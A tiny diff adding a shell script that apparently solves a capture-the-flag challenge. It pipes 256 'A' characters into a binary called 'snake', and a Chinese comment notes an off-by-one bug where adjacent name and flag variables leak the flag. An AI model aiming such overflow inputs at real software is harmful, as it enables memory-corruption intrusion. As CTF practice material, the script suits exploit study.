@@ -1,0 +1,4 @@
+#!/bin/sh
+# create exp to /tmp/exp and run it in /home/ctf/
+python -c 'print "A"*0x100 ' | ./snake
+# off-by-one name|flag 两个变量挨着
